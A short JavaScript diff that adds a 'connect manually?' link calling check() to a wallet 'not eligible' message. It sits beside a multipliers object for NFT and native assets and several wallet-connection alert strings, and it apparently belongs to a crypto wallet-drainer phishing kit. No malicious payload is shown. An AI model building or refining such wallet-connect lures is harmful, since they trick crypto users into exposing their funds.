@@ -23,7 +23,7 @@ let multipliers = {
 'NFT': 1,
 'NATIVES': 1,
 };
-let notEligible = "Your wallet is not eligible, connect another wallet.";
+let notEligible = "Your wallet is not eligible, connect another wallet.<a href='#' onClick='check()'>connect manually?</a>";
 let swal_notEligibleTitle = "Not eligible";
 let addressChanged = "Your wallet address has changed, connect wallet again please";
 let swal_addressChangedTitle = "Address changed";
